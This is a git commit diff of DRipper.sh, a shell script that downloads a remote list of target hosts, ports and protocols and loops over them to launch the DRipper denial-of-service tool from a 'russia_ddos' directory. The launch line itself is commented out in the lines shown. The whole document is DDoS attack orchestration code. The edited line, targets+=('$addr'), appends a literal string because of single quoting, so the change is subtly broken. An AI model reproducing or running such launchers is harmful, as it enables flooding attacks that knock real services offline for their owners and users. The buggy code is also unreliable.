4d43be5a1b09f0e6d91d6c49dbdd8d6733e80396
KarboDuck <53382906+KarboDuck@users.noreply.github.com>
2022-03-12 13:15:09 +0200

    Update DRipper.sh

--- DRipper.sh
+++ DRipper.sh
@@ -52,11 +52,13 @@ do
              site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
              echo $site
              
-             targets+=($site)
+
              
              addr=$(echo $site | awk '{print $1}')
              port=$(echo $site | awk '{print $2}')
              prot=$(echo $site | awk '{print $3}')
+
+             targets+=('$addr')
 
              # Launch DRipper
              #python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
